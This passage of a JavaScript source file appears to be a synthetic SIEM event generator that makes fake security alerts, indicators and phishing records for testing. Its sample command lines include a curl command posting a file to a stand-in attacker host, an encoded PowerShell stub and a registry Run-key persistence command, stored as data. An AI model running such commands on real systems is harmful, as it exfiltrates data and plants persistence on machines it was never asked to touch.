        'info': 'low',
        'low': 'medium',
        'medium': 'high',
        'high': 'critical',
        'critical': 'critical'
      };
      severity = escalation[severity] || severity;
    }

    return severity;
  }

  generateEventDetails(eventType, scenario, intensity) {
    const generators = {
      'authentication_failed': () => ({
        username: this.generateUsername(),
        reason: this.pickRandom(['Invalid password', 'Account locked', 'User not found', 'MFA failed']),
        attemptCount: Math.floor(Math.random() * 5) + 1,
        source: 'Active Directory'
      }),

      'malware_detected': () => ({
        malwareFamily: this.pickRandom(['TrickBot', 'Emotet', 'Cobalt Strike', 'Ryuk', 'Sodinokibi']),
        fileHash: crypto.randomBytes(32).toString('hex'),
        filePath: this.generateFilePath(),
        action: this.pickRandom(['Quarantined', 'Blocked', 'Detected']),
        signatures: Math.floor(Math.random() * 10) + 1
      }),

      'ransomware_activity': () => ({
        ransomwareFamily: this.pickRandom(['Ryuk', 'Conti', 'LockBit', 'BlackCat', 'REvil']),
        filesEncrypted: Math.floor(Math.random() * 10000) + 100,
        ransomNote: 'README_FOR_DECRYPT.txt',
        encryptionAlgorithm: 'AES-256',
        bitcoinAddress: this.generateBitcoinAddress()
      }),

      'data_exfiltration': () => ({
        dataSize: `${Math.floor(Math.random() * 1000) + 10} MB`,
        destination: this.generateIP(true),
        protocol: this.pickRandom(['HTTPS', 'FTP', 'DNS Tunneling', 'SSH']),
        port: this.pickRandom([443, 22, 21, 53]),
        fileCount: Math.floor(Math.random() * 500) + 1
      }),

      'phishing_clicked': () => ({
        emailSubject: this.pickRandom([
          'Urgent: CEO Approval Required',
          'Executive Directive: Immediate Action',
          'IT Security Alert: Password Reset',
          'CFO Request: Wire Transfer Approval'
        ]),
        sender: this.generateEmail(true),
        clickedUrl: this.generatePhishingURL(),
        credentialsEntered: Math.random() > 0.5,
        attachmentOpened: Math.random() > 0.7,
        authorityMarkers: ['urgent', 'executive', 'immediate']
      }),

      'lateral_movement': () => ({
        sourceHost: this.generateHostname(),
        targetHost: this.generateHostname(),
        method: this.pickRandom(['PsExec', 'WMI', 'RDP', 'SMB', 'PowerShell Remoting']),
        credentialType: this.pickRandom(['NTLM', 'Kerberos', 'Cached']),
        successfulAuth: Math.random() > 0.3
      }),

      'privilege_escalation': () => ({
        technique: this.pickRandom(['Token Impersonation', 'DLL Injection', 'Exploit', 'Scheduled Task']),
        fromPrivilege: 'User',
        toPrivilege: 'Administrator',
        cve: Math.random() > 0.5 ? `CVE-${2020 + Math.floor(Math.random() * 5)}-${Math.floor(Math.random() * 10000)}` : null
      })
    };

    const generator = generators[eventType];
    return generator ? generator() : { type: eventType, scenario };
  }

  generateIOC(eventType, scenario) {
    const ioc = {
      ipAddresses: [],
      domains: [],
      fileHashes: [],
      urls: [],
      emails: []
    };

    if (['malware_detected', 'ransomware_activity', 'data_exfiltration'].includes(eventType)) {
      ioc.ipAddresses.push(this.generateIP(true));
      ioc.fileHashes.push(crypto.randomBytes(32).toString('hex'));
    }

    if (eventType === 'phishing_clicked') {
      ioc.domains.push(this.generateDomain(true));
      ioc.emails.push(this.generateEmail(true));
      ioc.urls.push(this.generatePhishingURL());
    }

    if (eventType === 'data_exfiltration') {
      ioc.ipAddresses.push(this.generateIP(true));
      ioc.domains.push(this.generateDomain(true));
    }

    return ioc;
  }

  generateHostname() {
    const prefixes = ['WKS', 'SRV', 'DC', 'WEB', 'DB', 'APP', 'DEV'];
    const prefix = this.pickRandom(prefixes);
    const number = Math.floor(Math.random() * 999) + 1;
    return `${prefix}-${String(number).padStart(3, '0')}`;
  }

  generateUsername() {
    const firstNames = ['john', 'sarah', 'mike', 'emma', 'david', 'lisa', 'robert', 'maria'];
    const lastNames = ['smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller', 'davis', 'rodriguez', 'wilson'];
    return `${this.pickRandom(firstNames)}.${this.pickRandom(lastNames)}`;
  }

  generateIP(malicious = false) {
    if (malicious) {
      const octets = [
        Math.floor(Math.random() * 223) + 1,
        Math.floor(Math.random() * 256),
        Math.floor(Math.random() * 256),
        Math.floor(Math.random() * 256)
      ];
      return octets.join('.');
    } else {
      return `10.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 254) + 1}`;
    }
  }

  generateProcessName(eventType) {
    const normalProcesses = ['explorer.exe', 'chrome.exe', 'outlook.exe', 'teams.exe', 'excel.exe'];
    const suspiciousProcesses = ['powershell.exe', 'cmd.exe', 'psexec.exe', 'mimikatz.exe', 'rundll32.exe'];

    const isSuspicious = ['malware_detected', 'suspicious_process', 'privilege_escalation'].includes(eventType);
    return this.pickRandom(isSuspicious ? suspiciousProcesses : normalProcesses);
  }

  generateCommandLine(eventType) {
    const commands = {
      'malware_detected': 'powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...',
      'suspicious_process': 'cmd.exe /c reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
      'privilege_escalation': 'powershell.exe -ExecutionPolicy Bypass -File escalate.ps1',
      'data_exfiltration': 'curl -X POST https://attacker.com/exfil -d @sensitive.zip'
    };

    return commands[eventType] || 'N/A';
  }

  generateFilePath() {
    const paths = [
      'C:\\Windows\\Temp\\update.exe',
      'C:\\Users\\Public\\Downloads\\invoice.pdf.exe',
      'C:\\ProgramData\\suspicious.dll',
      '%APPDATA%\\Roaming\\malware.exe',
      'C:\\Windows\\System32\\svchost.exe'
    ];
    return this.pickRandom(paths);
  }

  generateEmail(malicious = false) {
    if (malicious) {
      const domains = ['suspicious-domain.com', 'fake-bank.net', 'phishing-site.org', 'secure-verify.com'];
      return `noreply@${this.pickRandom(domains)}`;
    }
    return `${this.generateUsername()}@company.com`;
  }

  generateDomain(malicious = false) {
    if (malicious) {
      return `${crypto.randomBytes(8).toString('hex')}.${this.pickRandom(['com', 'net', 'org', 'xyz'])}`;
    }
    return 'company.com';
  }

  generatePhishingURL() {
    const templates = [
      'https://secure-login-verify.com/auth',
      'https://account-recovery-team.net/reset',
      'https://notification-center.org/update',
      'http://your-bank-secure.com/verify',
      'https://ceo-approval-required.com/urgent'
    ];
    return this.pickRandom(templates);
  }

  generateBitcoinAddress() {
    return '1' + crypto.randomBytes(16).toString('hex').substring(0, 33);
  }

  generateGeoLocation() {
    const cities = [
      { city: 'New York', country: 'US', lat: 40.7128, lon: -74.0060 },
      { city: 'London', country: 'GB', lat: 51.5074, lon: -0.1278 },
      { city: 'Moscow', country: 'RU', lat: 55.7558, lon: 37.6173 },
      { city: 'Beijing', country: 'CN', lat: 39.9042, lon: 116.4074 },
      { city: 'Milan', country: 'IT', lat: 45.4642, lon: 9.1900 }
    ];
    return this.pickRandom(cities);
  }

  generateDeviceInfo() {
    return {
      os: this.pickRandom(['Windows 10', 'Windows 11', 'Windows Server 2019', 'macOS', 'Linux']),
      osVersion: `${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}`,
      deviceType: this.pickRandom(['Workstation', 'Server', 'Laptop', 'Virtual Machine'])
    };
  }

  generateNetworkInfo() {
    return {
      vlan: Math.floor(Math.random() * 100) + 1,
      subnet: `10.${Math.floor(Math.random() * 256)}.0.0/24`,
      gateway: `10.${Math.floor(Math.random() * 256)}.0.1`
    };
  }

  pickRandom(array) {
    return array[Math.floor(Math.random() * array.length)];
  }

  generateEvents(sourceId, eventType, count, distribution, scenario, intensity) {
    const events = [];
    const timeWindow = 60000;

    for (let i = 0; i < count; i++) {
      const event = this.generateEvent(sourceId, eventType, scenario, intensity);

      const offset = this.calculateTimeOffset(i, count, distribution, timeWindow);
      const eventTime = new Date(Date.now() + offset);
      event.timestamp = eventTime.toISOString();

      events.push(event);
    }

    return events;
  }

  calculateTimeOffset(index, total, distribution, timeWindow) {
    switch (distribution) {
      case 'normal':
        return this.normalDistribution(0, timeWindow / 2);

      case 'burst':
        return Math.random() * 5000;

      case 'constant':
        return (index / total) * timeWindow;

      case 'exponential':
        return Math.pow(index / total, 2) * timeWindow;

      case 'random':
      default:
        return Math.random() * timeWindow;
    }
  }

  normalDistribution(mean, stdDev) {
    const u1 = Math.random();
    const u2 = Math.random();
    const z0 = Math.sqrt(-2.0 * Math.log(u1)) * Math.cos(2.0 * Math.PI * u2);
    return mean + z0 * stdDev;
  }
}

module.exports = SIEMDataGenerator;
